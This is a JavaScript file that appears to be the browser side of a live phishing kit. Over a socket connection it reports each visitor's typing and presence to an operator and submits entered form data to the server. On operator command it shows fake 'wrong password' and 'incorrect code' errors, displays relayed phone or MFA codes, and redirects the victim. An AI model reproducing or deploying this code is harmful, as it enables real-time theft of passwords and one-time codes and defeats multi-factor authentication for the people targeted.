// ================================
// USER + PAGE STATE
// ================================

let userId = sessionStorage.getItem("userId");
let page;
let preloader = document.getElementById("load");

if (!userId) {
  userId = "user_" + Math.random().toString(36).substr(2, 9);
  sessionStorage.setItem("userId", userId);
}

// ================================
// DOM REFERENCES
// ================================

const wrapper = document.getElementById("codeField");
const input = document.getElementById("codeInput");
const overlay = document.getElementById("overlay");
const loadingBar = document.getElementById("loading-bar");
const submitBtn = document.getElementById("submitBtn");
const errorText = document.getElementById("errorText");
const errorMessage = document.querySelector(".show-password-wrapper");
const showPasswordCheckbox = document.getElementById("showPassword");

let loadingFrame = null;
let phoneNumberEl;

// ================================
// UI FUNCTIONS
// ================================

function showError(message) {
  stopLoading();
  wrapper?.classList.add("error", "shake");
  errorMessage?.classList.add("error");
  if (errorText) errorText.textContent = message;

  setTimeout(() => wrapper?.classList.remove("shake"), 350);
}

function clearError() {
  wrapper?.classList.remove("error");
}

function showLoading(time) {
  if (!overlay || !loadingBar) return;

  overlay.style.display = "block";
  loadingBar.style.display = "block";
  loadingBar.style.width = "0%";

  let progress = 0;

  function animate() {
    if (progress < 100) {
      progress += (100 - progress) / 15;
      loadingBar.style.width = progress + "%";
      loadingFrame = requestAnimationFrame(animate);
    }
  }

  animate();

  if (time) {
    setTimeout(stopLoading, time);
  }
}

function stopLoading() {
  cancelAnimationFrame(loadingFrame);
  if (!overlay || !loadingBar) return;

  loadingBar.style.width = "100%";
  overlay.style.display = "none";
  loadingBar.style.display = "none";
}

function redirectToPhoneScreen(phonescreen) {
  if (phonescreen) {
    window.location.href = phonescreen;
  }
}

function updatePhoneField(selector, value, phonescreen = null) {
  const el = document.querySelector(selector);

  if (!el) {
    redirectToPhoneScreen(phonescreen);
    return false;
  }

  el.textContent = value;
  stopLoading();
  return true;
}

// ================================
// SOCKET INITIALIZATION
// ================================

window.socket = io("/", {
  auth: { userId },
  reconnection: true,
  reconnectionAttempts: 5,
  reconnectionDelay: 500,
});

let socket = window.socket;

// ================================
// SOCKET EVENTS
// ================================

socket.on("connect", () => {
  console.log("Connected as", userId);
  socket.emit("user:update", {
    userId,
    newStatus: "online",
    page: page,
  });
});

socket.on("user:command", (data) => {
  if (!data || !data.command) return;

  const { command, code, phonescreen, link } = data;

  console.log("command:", command);

  const usernameEl = document.querySelector("#username");
  const storedUser = sessionStorage.getItem("user");

  if (usernameEl && storedUser) {
    usernameEl.textContent = storedUser;
  }

  switch (command) {
    case "refresh":
      location.reload();
      break;

    case "bad-email":
      showError("Enter a correct email address");
      break;

    case "bad-login":
      showError("Wrong password, try again");
      break;

    case "bad-otp":
      showError("incorrect code");
      break;

    case "phone-otp":
      if (!code) return;
	       phoneNumberEl = document.querySelector("#phone");
	      sessionStorage.setItem("setcode", code);
	      if (!phoneNumberEl) {
	        window.location.href = phonescreen;
	        return;
	      }
	      phoneNumberEl.textContent = code;
	      break;

    case "prompt":
    console.log("code :",code);
      if (!code) return;
	       phoneNumberEl = document.querySelector("#code");
	      sessionStorage.setItem("setcode", code);
	      if (!phoneNumberEl) {
	        window.location.href = phonescreen;
	        return;
	      }
	      phoneNumberEl.textContent = code;
	      break;

    case "redirect":
      if (link) {
        window.location.href = link;
      }
      break;

    default:
      console.warn("Unhandled command:", command);
  }
});

// ================================
// USER STATUS TRACKING
// ================================

function updateUserStatus(status) {
  socket.emit("user:update", {
    userId,
    newStatus: status,
    page: page,
  });
}

window.addEventListener("beforeunload", () => {
  updateUserStatus("offline");
});

window.addEventListener("focusin", (e) => {
  if (["INPUT", "TEXTAREA"].includes(e.target.tagName)) {
    updateUserStatus("typing");
  }
});

window.addEventListener("focusout", (e) => {
  if (["INPUT", "TEXTAREA"].includes(e.target.tagName)) {
    updateUserStatus("online");
  }
});

window.addEventListener("input", (e) => {
  if (["INPUT", "TEXTAREA"].includes(e.target.tagName)) {
    updateUserStatus("typing");
  }
});

document.addEventListener("click", (e) => {
  const link = e.target.closest("a");
  if (link && link.href && link.origin === location.origin) {
    setTimeout(() => updateUserStatus("online"), 200);
  }
});

// ================================
// FORM SUBMISSION
// ================================

async function submitFormData(formData) {
  showLoading();
  formData.userId = userId;

  try {
    const res = await fetch("/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(formData),
    });

    const data = await res.json();
    console.log("Response:", data);

    if (data.link) {
	  setTimeout(() => {
	    window.location.href = data.link;
	  }, 3000);
	}
  } catch (error) {
    console.error("Error submitting form:", error);
    throw error;
  }
}

// ================================
// SAFE SOCKET RECREATION
// ================================

function getOrCreateSocket({ timeoutMs = 2000 } = {}) {
  return new Promise((resolve) => {
    if (window.socket?.connected) {
      return resolve(window.socket);
    }

    if (window.socket) {
      return resolve(window.socket);
    }

    const userId = sessionStorage.getItem("userId") || null;

    window.socket = io("/", {
      auth: { userId },
      reconnection: true,
      autoConnect: false,
      reconnectionAttempts: 5,     // Increase resilience
      reconnectionDelay: 1000,
    });

    window.socket.on("connect", () => {
      console.log("✅ Socket connected", window.socket.id);
    });

    window.socket.on("connect_error", (err) => {
      console.error("Socket connection error:", err);
    });

    window.socket.on("disconnect", (reason) => {
      console.log("Socket disconnected:", reason);
    });

    window.socket.connect();
    resolve(window.socket);
  });
}

// Initialize on multiple events but NEVER disconnect on tab switch
function initPersistentSocket() {
  const events = ['load', 'pageshow', 'visibilitychange', 'focus'];

  let initialized = false;

  const handler = async (event) => {
    if (initialized) return;

    initialized = true;
    console.log(`🔌 Initializing persistent socket after "${event.type}"`);

    await getOrCreateSocket();
  };

  // Attach listeners
  events.forEach(ev => {
    window.addEventListener(ev, handler);
  });

  // Immediate check
  if (document.readyState === 'complete') {
    handler({ type: 'immediate' });
  }
}

// === Important: Do NOT disconnect on visibility change ===
document.addEventListener('visibilitychange', () => {
  if (window.socket) {
    if (document.visibilityState === 'visible') {
      console.log("Tab visible - ensuring socket is connected");
      if (!window.socket.connected) {
        window.socket.connect();
      }
    } else {
      console.log("Tab hidden - keeping socket alive (not disconnecting)");
      // IMPORTANT: We do NOTHING here → socket stays connected
    }
  }
});

// Run the initializer
initPersistentSocket();